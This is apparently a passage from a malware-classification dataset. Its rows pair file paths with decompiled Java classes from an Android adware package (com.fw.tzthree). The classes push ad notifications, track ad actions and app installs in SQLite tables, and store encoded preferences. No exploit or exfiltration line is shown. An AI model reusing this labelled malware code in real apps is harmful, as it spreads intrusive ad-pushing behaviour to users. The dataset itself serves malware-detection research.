StringBuilder();       f=s.f();       File file3=new File(file2,sb.append(f).append("".txt"").toString());       if (!file3.exists()) {         try {           file3.createNewFile();           int unused2=s.h=0;           boolean unused3=s.f=false;           String unused4=s.g=file3.getAbsolutePath();         }  catch (        IOException e) {           c(""createFile error , "" + e.getMessage());         }       }       return file3;     }   }   public static synchronized void b(  String str){ synchronized (t.class) {       File b=b();       if (b != null) {         try {           FileWriter fileWriter=new FileWriter(b,true);           BufferedWriter bufferedWriter=new BufferedWriter(fileWriter);           bufferedWriter.append((CharSequence)""\n"");           bufferedWriter.append((CharSequence)str);           bufferedWriter.append((CharSequence)""\n"");           bufferedWriter.flush();           bufferedWriter.close();           fileWriter.close();         }  catch (        IOException e) {           c(""writeLog error, "" + e.getMessage());         }       }  else {         c(""writeLog error, due to the file dir is error"");       }     }   }   private static void c(  String str){     String e;     if (s.a <= Integer.MAX_VALUE) {       e=s.e(str);       Log.e(e,str);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\u.code","public class u {   public static ImageView a(  View view){     if (!(view instanceof ViewGroup)) {       if (view instanceof ImageView) {         return (ImageView)view;       }       return null;     }     ViewGroup viewGroup=(ViewGroup)view;     for (int childCount=viewGroup.getChildCount(); childCount > 0; childCount--) {       ImageView a=a(viewGroup.getChildAt(childCount - 1));       if (a != null && a.getId() == 16908294) {         return a;       }     }     return null;   }   public static void a(  Context context,  int i){     ((NotificationManager)context.getSystemService(""notification"")).cancel(i);   }   public static void a(  Context context,  int i,  AdInfo adInfo,  int i2,  PendingIntent pendingIntent,  boolean z){     n.a(context,com.fw.tzthree.core.y.getCommonBusiness(context,i).getSetting(context,i).getResourcesAddr() + adInfo.getIcon(),new v(adInfo,context,pendingIntent,z,i2));   }   public static void a(  Context context,  AdInfo adInfo,  NotificationManager notificationManager,  Notification notification,  PendingIntent pendingIntent,  String str,  Bitmap bitmap,  int i,  int i2){     notification.setLatestEventInfo(context,adInfo.getAppName(),str,pendingIntent);     if (bitmap != null) {       ImageView a=a(View.inflate(context,notification.contentView.getLayoutId(),null));       int a2=n.a(context,45.0f);       if (a != null) {         notification.contentView.setImageViewBitmap(a.getId(),n.a(bitmap,a2,a2));       }     }     notification.flags=i;     notificationManager.notify(3038375 + adInfo.getAdId().intValue() + (i2 * 1000),notification);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\v.code","public final class v implements q {   final AdInfo a;   final Context b;   final PendingIntent c;   final boolean d;   final int e;   public v(  AdInfo adInfo,  Context context,  PendingIntent pendingIntent,  boolean z,  int i){     this.a=adInfo;     this.b=context;     this.c=pendingIntent;     this.d=z;     this.e=i;   }   @Override public void a(  Bitmap bitmap){     Notification notification=new Notification(R.drawable.ic_menu_share,this.a.getRecommend(),ab.a());     notification.setLatestEventInfo(this.b,this.a.getAppName(),this.a.getRecommend(),this.c);     ImageView a=u.a(View.inflate(this.b,notification.contentView.getLayoutId(),null));     int a2=n.a(this.b,45.0f);     if (a != null) {       notification.contentView.setImageViewBitmap(a.getId(),n.a(bitmap,a2,a2));     }     if (!this.d) {       notification.flags=32;     }     ((NotificationManager)this.b.getSystemService(""notification"")).notify(this.e,notification);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\w.code","public class w {   public static boolean a(  Context context,  String str){     try {       context.getPackageManager().getApplicationInfo(str,0);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\x.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3a2dff3a"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\y.code","public class y {   public static <K,V>Map<K,V> a(  byte[] bArr){     try {       ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(bArr);       ObjectInputStream objectInputStream=new ObjectInputStream(byteArrayInputStream);       HashMap hashMap=(HashMap)objectInputStream.readObject();       objectInputStream.close();       byteArrayInputStream.close();       return hashMap;     }  catch (    StreamCorruptedException e) {       return null;     } catch (    IOException e2) {       return null;     } catch (    ClassNotFoundException e3) {       return null;     }   }   public static <K,V>byte[] a(  Map<K,V> map){     try {       ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();       ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);       objectOutputStream.writeObject(map);       objectOutputStream.close();       byteArrayOutputStream.close();       return byteArrayOutputStream.toByteArray();     }  catch (    IOException e) {       e.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\z.code","public class z {   public static SharedPreferences a(  Context context){     return context.getSharedPreferences(com.fw.tzthree.b.a.g,0);   }   public static void a(  Context context,  String str,  String str2,  String str3,  String str4){     if (str4 == null) {       return;     }     context.getSharedPreferences(i.a(str,str3,true),0).edit().putString(i.a(str2,str3,true),i.a(str4,str3,true)).commit();   }   public static String b(  Context context,  String str,  String str2,  String str3,  String str4){     if (context == null) {       return str4;     }     String string=context.getSharedPreferences(i.a(str,str3,true),0).getString(i.a(str2,str3,true),str4);     if (string.equals(str4)) {       return str4;     }     try {       return i.b(string,str3,true);     }  catch (    UnsupportedEncodingException e) {       e.printStackTrace();       return str4;     } catch (    NumberFormatException e2) {       e2.printStackTrace();       return str4;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5c403c9"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\ActionInfo.code","public class ActionInfo {   private Integer action;   private Integer adId;   private Integer adType;   private String appName;   private Integer count;   private String date;   private Long expireDate;   private String packageName;   public ActionInfo(){   }   public ActionInfo(  Integer num,  Integer num2,  Integer num3,  Integer num4,  String str,  String str2,  String str3,  Long l){     this.adType=num;     this.adId=num2;     this.action=num3;     this.count=num4;     this.packageName=str;     this.appName=str2;     this.date=str3;     this.expireDate=l;   }   public Integer getAction(){     return this.action;   }   public Integer getAdId(){     return this.adId;   }   public Integer getAdType(){     return this.adType;   }   public String getAppName(){     return this.appName;   }   public Integer getCount(){     return this.count;   }   public String getDate(){     return this.date;   }   public Long getExpireDate(){     return this.expireDate;   }   public String getPackageName(){     return this.packageName;   }   public void setAction(  Integer num){     this.action=num;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAdType(  Integer num){     this.adType=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setCount(  Integer num){     this.count=num;   }   public void setDate(  String str){     this.date=str;   }   public void setExpireDate(  Long l){     this.expireDate=l;   }   public void setPackageName(  String str){     this.packageName=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\ActionInfoDao.code","public class ActionInfoDao extends AbstractDao<ActionInfo,Void> {   public static final String TABLENAME=""ACTION_INFO""; public class Properties {     public static final Property AdType=new Property(0,Integer.class,""adType"",false,""AD_TYPE"");     public static final Property AdId=new Property(1,Integer.class,""adId"",false,""AD_ID"");     public static final Property Action=new Property(2,Integer.class,""action"",false,""ACTION"");     public static final Property Count=new Property(3,Integer.class,""count"",false,""COUNT"");     public static final Property PackageName=new Property(4,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(5,String.class,""appName"",false,""APP_NAME"");     public static final Property Date=new Property(6,String.class,""date"",false,""DATE"");     public static final Property ExpireDate=new Property(7,Long.class,""expireDate"",false,""EXPIRE_DATE"");   }   public ActionInfoDao(  DaoConfig daoConfig){     super(daoConfig);   }   public ActionInfoDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     String str=z ? ""IF NOT EXISTS "" : """";     sQLiteDatabase.execSQL(""CREATE TABLE "" + str + ""'ACTION_INFO' ('AD_TYPE' INTEGER,'AD_ID' INTEGER,'ACTION' INTEGER,'COUNT' INTEGER,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'DATE' TEXT,'EXPIRE_DATE' INTEGER);"");     sQLiteDatabase.execSQL(""CREATE UNIQUE INDEX "" + str + ""IDX_ACTION_INFO_AD_TYPE_AD_ID_ACTION ON ACTION_INFO (AD_TYPE,AD_ID,ACTION);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'ACTION_INFO'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  ActionInfo actionInfo){     sQLiteStatement.clearBindings();     if (actionInfo.getAdType() != null) {       sQLiteStatement.bindLong(1,r0.intValue());     }     if (actionInfo.getAdId() != null) {       sQLiteStatement.bindLong(2,r0.intValue());     }     if (actionInfo.getAction() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (actionInfo.getCount() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String packageName=actionInfo.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(5,packageName);     }     String appName=actionInfo.getAppName();     if (appName != null) {       sQLiteStatement.bindString(6,appName);     }     String date=actionInfo.getDate();     if (date != null) {       sQLiteStatement.bindString(7,date);     }     Long expireDate=actionInfo.getExpireDate();     if (expireDate != null) {       sQLiteStatement.bindLong(8,expireDate.longValue());     }   }   @Override public Void getKey(  ActionInfo actionInfo){     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public ActionInfo readEntity(  Cursor cursor,  int i){     return new ActionInfo(cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0)),cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : Long.valueOf(cursor.getLong(i + 7)));   }   @Override public void readEntity(  Cursor cursor,  ActionInfo actionInfo,  int i){     actionInfo.setAdType(cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0)));     actionInfo.setAdId(cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)));     actionInfo.setAction(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     actionInfo.setCount(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     actionInfo.setPackageName(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     actionInfo.setAppName(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     actionInfo.setDate(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     actionInfo.setExpireDate(cursor.isNull(i + 7) ? null : Long.valueOf(cursor.getLong(i + 7)));   }   @Override public Void readKey(  Cursor cursor,  int i){     return null;   }   @Override public Void updateKeyAfterInsert(  ActionInfo actionInfo,  long j){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\AdHinge.code","public class AdHinge {   private Integer adId;   private Integer adType;   private Integer category;   private Boolean isOver;   private Integer lastAdId;   public AdHinge(){   }   public AdHinge(  Integer num,  Integer num2,  Boolean bool,  Integer num3,  Integer num4){     this.adId=num;     this.lastAdId=num2;     this.isOver=bool;     this.adType=num3;     this.category=num4;   }   public Integer getAdId(){     return this.adId;   }   public Integer getAdType(){     return this.adType;   }   public Integer getCategory(){     return this.category;   }   public Boolean getIsOver(){     return this.isOver;   }   public Integer getLastAdId(){     return this.lastAdId;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAdType(  Integer num){     this.adType=num;   }   public void setCategory(  Integer num){     this.category=num;   }   public void setIsOver(  Boolean bool){     this.isOver=bool;   }   public void setLastAdId(  Integer num){     this.lastAdId=num;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\AdHingeDao.code","public class AdHingeDao extends AbstractDao<AdHinge,Void> {   public static final String TABLENAME=""AD_HINGE""; public class Properties {     public static final Property AdId=new Property(0,Integer.class,""adId"",false,""AD_ID"");     public static final Property LastAdId=new Property(1,Integer.class,""lastAdId"",false,""LAST_AD_ID"");     public static final Property IsOver=new Property(2,Boolean.class,""isOver"",false,""IS_OVER"");     public static final Property AdType=new Property(3,Integer.class,""adType"",false,""AD_TYPE"");     public static final Property Category=new Property(4,Integer.class,""category"",false,""CATEGORY"");   }   public AdHingeDao(  DaoConfig daoConfig){     super(daoConfig);   }   public AdHingeDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     String str=z ? ""IF NOT EXISTS "" : """";     sQLiteDatabase.execSQL(""CREATE TABLE "" + str + ""'AD_HINGE' ('AD_ID' INTEGER,'LAST_AD_ID' INTEGER,'IS_OVER' INTEGER,'AD_TYPE' INTEGER,'CATEGORY' INTEGER);"");     sQLiteDatabase.execSQL(""CREATE UNIQUE INDEX "" + str + ""IDX_AD_HINGE_AD_TYPE_CATEGORY ON AD_HINGE (AD_TYPE,CATEGORY);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'AD_HINGE'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  AdHinge adHinge){     sQLiteStatement.clearBindings();     if (adHinge.getAdId() != null) {       sQLiteStatement.bindLong(1,r0.intValue());     }     if (adHinge.getLastAdId() != null) {       sQLiteStatement.bindLong(2,r0.intValue());     }     Boolean isOver=adHinge.getIsOver();     if (isOver != null) {       sQLiteStatement.bindLong(3,isOver.booleanValue() ? 1L : 0L);     }     if (adHinge.getAdType() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     if (adHinge.getCategory() != null) {       sQLiteStatement.bindLong(5,r0.intValue());     }   }   @Override public Void getKey(  AdHinge adHinge){     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public AdHinge readEntity(  Cursor cursor,  int i){     Boolean valueOf;     Integer valueOf2=cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0));     Integer valueOf3=cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1));     if (cursor.isNull(i + 2)) {       valueOf=null;     }  else {       valueOf=Boolean.valueOf(cursor.getShort(i + 2) != 0);     }     return new AdHinge(valueOf2,valueOf3,valueOf,cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : Integer.valueOf(cursor.getInt(i + 4)));   }   @Override public void readEntity(  Cursor cursor,  AdHinge adHinge,  int i){     Boolean valueOf;     adHinge.setAdId(cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0)));     adHinge.setLastAdId(cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)));     if (cursor.isNull(i + 2)) {       valueOf=null;     }  else {       valueOf=Boolean.valueOf(cursor.getShort(i + 2) != 0);     }     adHinge.setIsOver(valueOf);     adHinge.setAdType(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     adHinge.setCategory(cursor.isNull(i + 4) ? null : Integer.valueOf(cursor.getInt(i + 4)));   }   @Override public Void readKey(  Cursor cursor,  int i){     return null;   }   @Override public Void updateKeyAfterInsert(  AdHinge adHinge,  long j){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\AppendData.code","public class AppendData {   private Long adType;   private byte[] data;   public AppendData(){   }   public AppendData(  Long l){     this.adType=l;   }   public AppendData(  Long l,  byte[] bArr){     this.adType=l;     this.data=bArr;   }   public Long getAdType(){     return this.adType;   }   public byte[] getData(){     return this.data;   }   public void setAdType(  Long l){     this.adType=l;   }   public void setData(  byte[] bArr){     this.data=bArr;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\AppendDataDao.code","public class AppendDataDao extends AbstractDao<AppendData,Long> {   public static final String TABLENAME=""APPEND_DATA""; public class Properties {     public static final Property AdType=new Property(0,Long.class,""adType"",true,""AD_TYPE"");     public static final Property Data=new Property(1,byte[].class,""data"",false,""DATA"");   }   public AppendDataDao(  DaoConfig daoConfig){     super(daoConfig);   }   public AppendDataDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'APPEND_DATA' ('AD_TYPE' INTEGER PRIMARY KEY ,'DATA' BLOB);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'APPEND_DATA'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  AppendData appendData){     sQLiteStatement.clearBindings();     Long adType=appendData.getAdType();     if (adType != null) {       sQLiteStatement.bindLong(1,adType.longValue());     }     byte[] data=appendData.getData();     if (data != null) {       sQLiteStatement.bindBlob(2,data);     }   }   @Override public Long getKey(  AppendData appendData){     if (appendData != null) {       return appendData.getAdType();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public AppendData readEntity(  Cursor cursor,  int i){     return new AppendData(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : cursor.getBlob(i + 1));   }   @Override public void readEntity(  Cursor cursor,  AppendData appendData,  int i){     appendData.setAdType(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     appendData.setData(cursor.isNull(i + 1) ? null : cursor.getBlob(i + 1));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  AppendData appendData,  long j){     appendData.setAdType(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\AppInfo.code","public class AppInfo {   private Integer adId;   private Integer adType;   private String appName;   private String appSize;   private Integer downloadType;   private String g2Switches;   private String g3Switches;   private String icon;   private Long installTime;   private String packageName;   private String recommend;   private String url;   private String wifiSwitches;   public AppInfo(){   }   public AppInfo(  Long l,  Integer num,  String str,  String str2,  String str3,  String str4,  String str5,  Integer num2,  String str6,  String str7,  String str8,  Integer num3,  String str9){     this.installTime=l;     this.adId=num;     this.appSize=str;     this.appName=str2;     this.g2Switches=str3;     this.g3Switches=str4;     this.wifiSwitches=str5;     this.adType=num2;     this.icon=str6;     this.recommend=str7;     this.url=str8;     this.downloadType=num3;     this.packageName=str9;   }   public Integer getAdId(){     return this.adId;   }   public Integer getAdType(){     return this.adType;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public Integer getDownloadType(){     return this.downloadType;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Long getInstallTime(){     return this.installTime;   }   public String getPackageName(){     return this.packageName;   }   public String getRecommend(){     return this.recommend;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAdType(  Integer num){     this.adType=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setDownloadType(  Integer num){     this.downloadType=num;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setInstallTime(  Long l){     this.installTime=l;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\AppInfoDao.code","public class AppInfoDao extends AbstractDao<AppInfo,Void> {   public static final String TABLENAME=""APP_INFO""; public class Properties {     public static final Property InstallTime=new Property(0,Long.class,""installTime"",false,""INSTALL_TIME"");     public static final Property AdId=new Property(1,Integer.class,""adId"",false,""AD_ID"");     public static final Property AppSize=new Property(2,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppName=new Property(3,String.class,""appName"",false,""APP_NAME"");     public static final Property G2Switches=new Property(4,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(5,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(6,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property AdType=new Property(7,Integer.class,""adType"",false,""AD_TYPE"");     public static final Property Icon=new Property(8,String.class,""icon"",false,""ICON"");     public static final Property Recommend=new Property(9,String.class,""recommend"",false,""RECOMMEND"");     public static final Property Url=new Property(10,String.class,""url"",false,""URL"");     public static final Property DownloadType=new Property(11,Integer.class,""downloadType"",false,""DOWNLOAD_TYPE"");     public static final Property PackageName=new Property(12,String.class,""packageName"",false,""PACKAGE_NAME"");   }   public AppInfoDao(  DaoConfig daoConfig){     super(daoConfig);   }   public AppInfoDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     String str=z ? ""IF NOT EXISTS "" : """";     sQLiteDatabase.execSQL(""CREATE TABLE "" + str + ""'APP_INFO' ('INSTALL_TIME' INTEGER,'AD_ID' INTEGER,'APP_SIZE' TEXT,'APP_NAME' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'AD_TYPE' INTEGER,'ICON' TEXT,'RECOMMEND' TEXT,'URL' TEXT,'DOWNLOAD_TYPE' INTEGER,'PACKAGE_NAME' TEXT);"");     sQLiteDatabase.execSQL(""CREATE UNIQUE INDEX "" + str + ""IDX_APP_INFO_PACKAGE_NAME ON APP_INFO (PACKAGE_NAME);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'APP_INFO'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  AppInfo appInfo){     sQLiteStatement.clearBindings();     Long installTime=appInfo.getInstallTime();     if (installTime != null) {       sQLiteStatement.bindLong(1,installTime.longValue());     }     if (appInfo.getAdId() != null) {       sQLiteStatement.bindLong(2,r0.intValue());     }     String appSize=appInfo.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(3,appSize);     }     String appName=appInfo.getAppName();     if (appName != null) {       sQLiteStatement.bindString(4,appName);     }     String g2Switches=appInfo.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(5,g2Switches);     }     String g3Switches=appInfo.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(6,g3Switches);     }     String wifiSwitches=appInfo.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(7,wifiSwitches);     }     if (appInfo.getAdType() != null) {       sQLiteStatement.bindLong(8,r0.intValue());     }     String icon=appInfo.getIcon();     if (icon != null) {       sQLiteStatement.bindString(9,icon);     }     String recommend=appInfo.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(10,recommend);     }     String url=appInfo.getUrl();     if (url != null) {       sQLiteStatement.bindString(11,url);     }     if (appInfo.getDownloadType() != null) {       sQLiteStatement.bindLong(12,r0.intValue());     }     String packageName=appInfo.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(13,packageName);     }   }   @Override public Void getKey(  AppInfo appInfo){     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public AppInfo readEntity(  Cursor cursor,  int i){     return new AppInfo(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)),cursor.isNull(i + 2) ? null : cursor.getString(i + 2),cursor.isNull(i + 3) ? null : cursor.getString(i + 3),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : Integer.valueOf(cursor.getInt(i + 7)),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : Integer.valueOf(cursor.getInt(i + 11)),cursor.isNull(i + 12) ? null : cursor.getString(i + 12));   }   @Override public void readEntity(  Cursor cursor,  AppInfo appInfo,  int i){     appInfo.setInstallTime(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     appInfo.setAdId(cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)));     appInfo.setAppSize(cursor.isNull(i + 2) ? null : cursor.getString(i + 2));     appInfo.setAppName(cursor.isNull(i + 3) ? null : cursor.getString(i + 3));     appInfo.setG2Switches(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     appInfo.setG3Switches(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     appInfo.setWifiSwitches(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     appInfo.setAdType(cursor.isNull(i + 7) ? null : Integer.valueOf(cursor.getInt(i + 7)));     appInfo.setIcon(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     appInfo.setRecommend(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     appInfo.setUrl(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     appInfo.setDownloadType(cursor.isNull(i + 11) ? null : Integer.valueOf(cursor.getInt(i + 11)));     appInfo.setPackageName(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));   }   @Override public Void readKey(  Cursor cursor,  int i){     return null;   }   @Override public Void updateKeyAfterInsert(  AppInfo appInfo,  long j){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\AppWallAd.code","public class AppWallAd {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private Long expires;   private String g2Switches;   private String g3Switches;   private Integer hasBoundAd;   private String icon;   private Long id;   private String intro;   private Integer isRecommend;   private Integer kind;   private String packageName;   private String printscreen;   private String recommend;   private String showPeriod;   private String url;   private String wifiSwitches;   public AppWallAd(){   }   public AppWallAd(  Long l){     this.id=l;   }   public AppWallAd(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  Integer num3,  Integer num4){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.hasBoundAd=num3;     this.isRecommend=num4;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public Integer getHasBoundAd(){     return this.hasBoundAd;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getIsRecommend(){     return this.isRecommend;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setHasBoundAd(  Integer num){     this.hasBoundAd=num;   }   public void setIcon(  String str){     this.icon=str;   }   